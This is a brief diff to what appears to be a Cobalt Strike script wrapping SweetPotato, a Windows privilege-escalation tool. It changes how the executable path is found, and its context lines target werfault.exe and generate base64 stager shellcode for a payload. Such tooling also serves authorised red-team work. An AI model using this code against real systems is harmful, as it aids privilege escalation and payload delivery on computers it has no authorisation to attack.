@@ -14,7 +14,7 @@ sub SweetPotato {
         $arch = "x86";
 	}
 	$program = "c:\\windows\\system32\\werfault.exe";
-	$exe = getFileProper(script_resource("modules"), "SweetPotato.exe");
+	$exe = script_resource("SweetPotato.exe");
     # generate our shellcode
 	$shellcode = base64_encode(artifact_stager($2, "raw", $arch));
 	# -c 4991D34B-80A1-4291-83B6-3328366B9097 
